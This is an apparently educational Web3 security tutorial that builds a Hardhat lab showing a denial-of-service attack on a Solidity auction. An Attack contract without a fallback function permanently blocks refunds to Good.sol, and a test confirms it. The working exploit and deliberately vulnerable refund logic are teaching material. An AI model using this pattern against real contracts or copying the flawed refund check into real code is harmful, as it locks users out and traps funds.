# Denial of Service

This is a very common attack which we all know about in web2 as well but today we will try to immitate a Denial of Service attack on a smart contract

Lets goo 🚀


## What is DOS?

A DOS attack is an attack which is meant to make a system inaccessible to its intended users. This is usually done by flodding the network with traffic or sending some information which makes the system crash. 


## DOS Attack on a smart contract

### What will happen?

There will be two smart contracts - `Good.sol` and `Attack.sol`. `Good.sol` will be used to run a sample aution where it will have a function in which the current user can become the current winner of the auction by sending  `Good.sol` ETH which is of more value than the ETH which was sent by the previous winner. After the winner is replaced, the old winner is sent back the money which he initially sent to the contract.

`Attack.sol` will attack in such a manner that after becoming the current winner of the auction, it will not allow anyone else to replace it even if the address trying to win is willing to put in more ETH. Thus `Attack.sol` will bring `Game.sol` under a DOS attack because after it becomes the winner, it will deny the ability for any other address to becomes the winner.


### Build

Lets build an example where you can experience how the the attack happens.

- To setup a Hardhat project, Open up a terminal and execute these commands

  ```bash
  npm init --yes
  npm install --save-dev hardhat
  ```

- In the same directory where you installed Hardhat run:

  ```bash
  npx hardhat
  ```

  - Select `Create a basic sample project`
  - Press enter for the already specified `Hardhat Project root`
  - Press enter for the question on if you want to add a `.gitignore`
  - Press enter for `Do you want to install this sample project's dependencies with npm (@nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers)?`

Now you have a hardhat project ready to go!

If you are not on mac, please do this extra step and install these libraries as well :)

```bash
npm install --save-dev @nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers
```

and press `enter` for all the questions.

Now  create a contract named `Attack.sol` within the `contracts` directory and write thee following lines of code

```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Good.sol";

contract Attack {
    Good good;

    constructor(address _good) {
        good = Good(_good);
    }

    function attack() public payable {
        good.setCurrentAuctionPrice{value: msg.value}();
    }
}
```

After creating, `Attack.sol` in the same `contracts` directory create a new file `Good.sol`

```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract Good {
    address public currentWinner;
    uint public currentAuctionPrice;

    constructor() {
        currentWinner = msg.sender;
    }

    function setCurrentAuctionPrice() public payable {
        require(msg.value > currentAuctionPrice, "Need to pay more than the currentAuctionPrice");
        (bool sent, ) = currentWinner.call{value: currentAuctionPrice}("");
        if(sent) {
            currentAuctionPrice = msg.value;
            currentWinner = msg.sender;
        }
    }
}
```


Now lets try immitating the attack using a sample test, create a new file under `test` folder named `attack.js` and add the following lines of code to it

```javascript
const { expect } = require("chai");
const { BigNumber } = require("ethers");
const { ethers, waffle } = require("hardhat");

describe("Attack", function () {
  it("After being declared the winner, Attack.sol should not allow anyone else to become the winner", async function () {
    // Deploy the good contract
    const goodContract = await ethers.getContractFactory("Good");
    const _goodContract = await goodContract.deploy();
    await _goodContract.deployed();
    console.log("Good Contract's Address:", _goodContract.address);

    // Deploy the Attack contract
    const attackContract = await ethers.getContractFactory("Attack");
    const _attackContract = await attackContract.deploy(_goodContract.address);
    await _attackContract.deployed();
    console.log("Attack Contract's Address", _attackContract.address);

    // Now lets attack the good contract
    // Get two addresses
    const [_, addr1, addr2] = await ethers.getSigners();

    // Initially let addr1 become the current winner of the aution
    let tx = await _goodContract.connect(addr1).setCurrentAuctionPrice({
      value: ethers.utils.parseEther("1"),
    });
    await tx.wait();

    // Start the attack and make Attack.sol the current winner of the auction
    tx = await _attackContract.attack({
      value: ethers.utils.parseEther("3.0"),
    });
    await tx.wait();

    // Now lets trying making addr2 the current winner of the auction
    tx = await _goodContract.connect(addr2).setCurrentAuctionPrice({
      value: ethers.utils.parseEther("4"),
    });
    await tx.wait();

    // Now lets check if the current winner is still attack contract
    expect(await _goodContract.currentWinner()).to.equal(
      _attackContract.address
    );
  });
});
```

Notice how `Attack.sol` will lead `Good.sol` into a DOS attack. First addr1 will become the current winner by calling setCurrentAuctionPrice on `Good.sol` then `Attack.sol` will become the current winner by sending more ETH than addr1 using the attack function. Now when addr2 will try to become the new winner, it wont be able to do that because of this check(`if(sent)`) present in the `Good.sol` contract which verifies that the current winner should only be changed if the ETH is sent back to the previous current winner

Now because `Attack.sol` doesnt have a `fallback` function which is necessary to accept ETH payments, `sent` is always `false` and thus the current winner is never updated and `addr2` can never become the current winner


To run the test, in your terminal pointing to the root directory of this level execute the following command

```bash
npx hardhat test
```

When the tests pass, you will notice that the `Good.sol` is now under DOS attack because after `Attack.sol` becomes the current winner, on other address can becomes the current winner. 


Hope you liked this level ❤️, keep building.

WAGMI 🚀
